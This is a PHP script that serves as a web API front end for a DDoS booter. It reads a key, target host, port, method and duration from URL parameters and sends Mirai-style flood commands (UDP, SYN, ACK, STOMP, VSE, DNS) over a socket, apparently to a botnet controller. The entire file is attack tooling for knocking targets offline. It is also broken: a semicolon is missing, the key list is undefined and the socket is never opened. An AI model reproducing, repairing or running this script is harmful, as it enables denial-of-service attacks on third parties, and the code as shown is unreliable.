<?php
error_reporting(E_ALL);

    $attackMethods = array("RAWUDP", "ACK", "STOMP", "DNS", "VSE", "SYN");

    function htmlsc($string)
    {

        return htmlspecialchars($string, ENT_QUOTES, "UTF-8");

    }
    if (!isset($_GET["key"]) || !isset($_GET["host"]) || !isset($_GET["port"]) || !isset($_GET["method"]) || !isset($_GET["time"]))

        die("You are missing a parameter");

    $key = htmlsc($_GET["key"]);
    $host = htmlsc($_GET["host"]);
    $port = htmlsc($_GET["port"]);
    $method = htmlsc(strtoupper($_GET["method"]));
    $time = htmlsc($_GET["time"]);
    $command = "";

    if (!in_array($key, $APIKeys)) die("Invalid API key");
    if (!in_array($method, $attackMethods)) die("Invalid attack method")
    if ($method == "RAWUDP") $command = "udpplain $host $time len=65500 rand=1 dport=$port\r\n";
    else if ($method == "DNS") $command = "dns $host $time dport=$port domain=$host\r\n";
	  else if ($method == "SYN") $command = "syn $host $time dport=$port\r\n";
	  else if ($method == "ACK") $command = "ack $host $time dport=$port\r\n";
	  else if ($method == "STOMP") $command = "stomp $host $time dport=$port\r\n";
    else if ($method == "VSE") $command = "vse $host $time dport=$port\r\n";
  
    ($socket ? null : die("Failed to connect"));
	fwrite($socket, " \r\n"); // Leave This.
	sleep(3);
 
	sleep(3);
 
    sleep(9);
    fwrite($socket, $command);
    fclose($socket);
    echo "Attack sent to $host:$port for $time seconds using method $method!\n";
	
?>